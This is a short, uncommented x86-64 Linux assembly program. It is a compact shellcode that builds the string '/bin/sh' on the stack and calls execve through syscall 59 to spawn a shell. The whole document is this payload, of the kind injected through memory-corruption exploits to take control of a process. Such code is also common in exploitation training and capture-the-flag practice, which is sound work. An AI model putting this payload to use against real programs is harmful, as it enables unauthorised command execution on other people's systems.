section .text
global _start
_start:
	mov rax, 0x68732f6e69622f
	push rax
	push rsp
	pop rdi
	xor eax, eax
	push rax
	mov al, 59
	push rsp
	pop rdx
	push rsp
	pop rsi
	syscall